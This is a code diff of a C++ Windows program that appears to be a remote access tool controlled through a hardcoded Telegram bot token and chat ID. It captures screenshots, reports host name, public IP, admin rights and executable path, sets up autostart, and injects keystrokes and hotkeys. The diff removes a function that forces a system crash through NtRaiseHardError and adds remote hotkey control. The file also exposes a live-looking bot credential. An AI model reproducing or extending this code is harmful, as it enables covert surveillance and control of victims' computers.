@@ -19,7 +19,6 @@ using json = nlohmann::json;
 string ID;
 const string botApi = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664"; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
 const string chat_id = "-1001487776950";
-time_t uptime_start;
 
 inline bool filexits(const string& name) {
     struct stat buffer;
@@ -95,11 +94,21 @@ void setID(string newID)
     file.close();
 }
 
-inline void press(char a)
+inline void press(char a, bool bigone = 0)
 {
-    keybd_event(VkKeyScan(a), 1, 0, 0);
-    Sleep(5);
-    keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
+    if (bigone) {
+        keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
+        Sleep(5);
+        keybd_event(VkKeyScan(a), 1, 0, 0);
+        Sleep(5);
+        keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
+        keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
+    }
+    else {
+        keybd_event(VkKeyScan(a), 1, 0, 0);
+        Sleep(5);
+        keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
+    }
 }
 
 
@@ -146,21 +155,6 @@ void TakeScreenShot(const std::string& path)
     fi.open(path, std::fstream::binary | std::fstream::out);
     fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
     fi.close();
-}
-
-void crash() {
-
-    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
-    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-
-    BOOLEAN bEnabled;
-    ULONG uResp;
-    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
-    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
-    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
-    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
 }
 
 string get_exe() {
@@ -257,11 +251,10 @@ Cleanup:
 string getStatus() {
     string status;
 
-    int uptime_h = (time(nullptr) - uptime_start)/CLOCKS_PER_SEC/3600;
-    int uptime_m = ((time(nullptr) - uptime_start) / CLOCKS_PER_SEC)/60;
+    int uptime_h = ((double)clock())/CLOCKS_PER_SEC/3600;
+    int uptime_m = ((double)clock()) /CLOCKS_PER_SEC/60;
     uptime_m -= uptime_h * 60;
     if (uptime_m < 0)uptime_m = 0;
-    
     status = "uptime: " + to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
     status += "exe_name: " + get_exe() + '\n';
     string buffer = exec("hostname");
@@ -269,9 +262,8 @@ string getStatus() {
     status += "host_name: " + buffer + '\n';
     auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
     status += "public_ip: " + response.text + '\n';
-    status += "admin_rights: " + to_string(IsProcessElevated());
-    
-    cout << status << endl;
+    status += "admin_rights: " + to_string(IsProcessElevated()) + '\n';
+    status += "exe_path: " + get_path();
     return status;
 }
 
@@ -325,3 +317,105 @@ void autostart() {
         remove("shitoo");
     }
 }
+
+void hotkeys(string hotkey) {
+    string buff;
+    //pressing keys
+    for (int i = 0; i < hotkey.size(); i++) {
+        if (hotkey[i] == '+') {
+            //it looks like a shit but idk other way
+            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, 0, 0);
+            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+            else if (buff == "lmouse") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0); }
+
+            buff.clear();
+        }
+        else buff += hotkey[i];
+    }
+    //unpressing keys
+    buff.clear();
+    for (int i = 0; i < hotkey.size(); i++) {
+        if (hotkey[i] == '+') {
+            //it looks like a shit but idk other way
+            if (buff.size() == 1 && buff[0] >= 97 && buff[0] <= 122) keybd_event(VkKeyScan(buff[0]), 1, KEYEVENTF_KEYUP, 0);
+            else if (buff == "esc") { keybd_event(VK_ESCAPE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "tab") { keybd_event(VK_TAB, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "capslock") { keybd_event(VK_CAPITAL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "shift") { keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "ctrl") { keybd_event(VK_CONTROL, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "win") { keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "alt") { keybd_event(VK_MENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "ralt") { keybd_event(VK_RMENU, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "space") { keybd_event(VK_SPACE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "enter") { keybd_event(VK_RETURN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "backspace") { keybd_event(VK_BACK, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "del") { keybd_event(VK_DELETE, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f1") { keybd_event(VK_F1, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f2") { keybd_event(VK_F2, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f3") { keybd_event(VK_F3, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f4") { keybd_event(VK_F4, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f5") { keybd_event(VK_F5, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f6") { keybd_event(VK_F6, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f7") { keybd_event(VK_F7, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f8") { keybd_event(VK_F8, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f9") { keybd_event(VK_F9, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f10") { keybd_event(VK_F10, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f11") { keybd_event(VK_F11, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "f12") { keybd_event(VK_F12, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "ins") { keybd_event(VK_INSERT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "home") { keybd_event(VK_HOME, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "end") { keybd_event(VK_END, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "pgdn") { keybd_event(VK_NEXT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "pgup") { keybd_event(VK_PRIOR, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "uparrow") { keybd_event(VK_UP, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "downarrow") { keybd_event(VK_DOWN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "leftarrow") { keybd_event(VK_LEFT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "rightarrow") { keybd_event(VK_RIGHT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+            else if (buff == "leftbutton") { keybd_event(VK_LBUTTON, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); }
+
+            buff.clear();
+        }
+        else buff += hotkey[i];
+    }
+}
+
+void logo() {
+    cout << "     _                   _      _____  ___   ___   ___" << endl
+        << "  __| |_   _ _ __  _ __ (_)_  _|___ / / _ \\ / _ \\ / _ \\" << endl
+        << " / _` | | | | '_ \\| '_ \\| \\ \\/ / |_ \\| | | | | | | | | |" << endl
+        << "| (_| | |_| | |_) | | | | |>  < ___) | |_| | |_| | |_| |" << endl
+        << " \\__,_|\\__,_| .__/|_| |_|_/_/\\_\\____/ \\___/ \\___/ \\___/" << endl
+        << "            |_|" << endl;
+}      
